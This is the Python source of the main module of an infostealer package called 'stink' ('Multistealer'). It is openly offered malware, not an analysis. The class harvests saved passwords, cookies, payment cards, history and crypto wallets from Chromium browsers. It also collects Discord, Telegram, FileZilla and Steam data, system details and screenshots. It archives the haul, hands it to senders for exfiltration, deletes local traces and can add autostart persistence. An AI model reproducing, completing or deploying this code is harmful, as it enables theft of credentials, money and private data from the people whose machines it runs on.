from sys import argv
from threading import Thread
from multiprocessing import Pool
from os import path, makedirs, remove
from shutil import rmtree, make_archive

from stink.helpers import functions
from stink.enums import Features, Utils
from stink.utils import Autostart, Message
from stink.helpers.config import MultistealerConfig, Browsers
from stink.modules import Chromium, Discord, FileZilla, Processes, Screenshot, System, Telegram, Steam


class Stealer(Thread):
    """
    Collects and sends the specified data.
    """

    def __init__(self, senders: list = [], features: list = [Features.all], utils: list = []):
        Thread.__init__(self, name="Stealer")

        self.__senders = senders
        self.__errors = True if Utils.errors in utils else False
        self.__autostart = True if Utils.autostart in utils else False
        self.__message = True if Utils.message in utils else False

        self.__config = MultistealerConfig()

        browser_functions = [module for module in [
            Features.passwords,
            Features.cookies,
            Features.cards,
            Features.history,
            Features.bookmarks,
            Features.extensions,
            Features.wallets
        ] if module in features or Features.all in features]
        browser_statuses = True if len(browser_functions) > 0 else False

        self.__methods = [
            {
                "object": Chromium(
                    Browsers.CHROME.value,
                    self.__config.StoragePath,
                    *self.__config.ChromePaths,
                    browser_functions,
                    self.__errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    Browsers.OPERA_GX.value,
                    self.__config.StoragePath,
                    *self.__config.OperaGXPaths,
                    browser_functions,
                    self.__errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    Browsers.OPERA_DEFAULT.value,
                    self.__config.StoragePath,
                    *self.__config.OperaDefaultPaths,
                    browser_functions,
                    self.__errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    Browsers.EDGE.value,
                    self.__config.StoragePath,
                    *self.__config.MicrosoftEdgePaths,
                    browser_functions,
                    self.__errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    Browsers.BRAVE.value,
                    self.__config.StoragePath,
                    *self.__config.BravePaths,
                    browser_functions,
                    self.__errors
                ),
                "status": browser_statuses
            },
            {
                "object": Chromium(
                    Browsers.VIVALDI.value,
                    self.__config.StoragePath,
                    *self.__config.VivaldiPaths,
                    browser_functions,
                    self.__errors
                ),
                "status": browser_statuses
            },
            {
                "object": System(
                    self.__config.StoragePath,
                    "System",
                    self.__errors
                ),
                "status": True if (Features.system in features or Features.all in features) else False
            },
            {
                "object": Processes(
                    self.__config.StoragePath,
                    "System",
                    self.__errors
                ),
                "status": True if (Features.processes in features or Features.all in features) else False
            },
            {
                "object": Screenshot(
                    self.__config.StoragePath,
                    "System",
                    self.__errors
                ),
                "status": True if (Features.screenshot in features or Features.all in features) else False
            },
            {
                "object": Discord(
                    self.__config.StoragePath,
                    r"Programs\Discord",
                    self.__errors
                ),
                "status": True if (Features.discord in features or Features.all in features) else False
            },
            {
                "object": Telegram(
                    self.__config.StoragePath,
                    r"Programs\Telegram",
                    self.__errors
                ),
                "status": True if (Features.telegram in features or Features.all in features) else False
            },
            {
                "object": FileZilla(
                    self.__config.StoragePath,
                    r"Programs\FileZilla",
                    self.__errors
                ),
                "status": True if (Features.filezilla in features or Features.all in features) else False
            },
            {
                "object": Steam(
                    self.__config.StoragePath,
                    r"Programs\Steam",
                    self.__errors
                ),
                "status": True if (Features.steam in features or Features.all in features) else False
            }
        ]

    def __create_storage(self) -> None:
        """
        Creates storage for the Stink.
        :return: None
        """
        if not path.exists(self.__config.StoragePath):
            makedirs(self.__config.StoragePath)
        else:
            rmtree(self.__config.StoragePath)
            makedirs(self.__config.StoragePath)

    def __create_archive(self) -> None:
        """
        Creates a data archive.
        :return: None
        """
        make_archive(rf"{path.dirname(self.__config.StoragePath)}\{self.__config.ZipName}", "zip", self.__config.StoragePath)

    def __delete_files(self) -> None:
        """
        Deletes the archive and storage.
        :return: None
        """
        rmtree(self.__config.StoragePath)
        remove(rf"{path.dirname(self.__config.StoragePath)}\{self.__config.ZipName}.zip")

    def run(self) -> None:
        """
        Launches the Stink.
        :return: None
        """
        try:

            self.__create_storage()

            with Pool(processes=self.__config.PoolSize) as pool:
                pool.map(functions.run_process, [
                    method["object"] for method in self.__methods if method["status"] is True
                ])

            pool.close()

            self.__create_archive()

            for sender in self.__senders:
                sender.run(self.__config.ZipName, self.__config.StoragePath, self.__errors)

            self.__delete_files()

            if self.__autostart is True:
                Autostart(argv[0], self.__errors).run()

            if self.__message is True:
                Message(self.__errors).run()

        except Exception as e:
            if self.__errors is True: print(f"[Multistealer]: {repr(e)}")
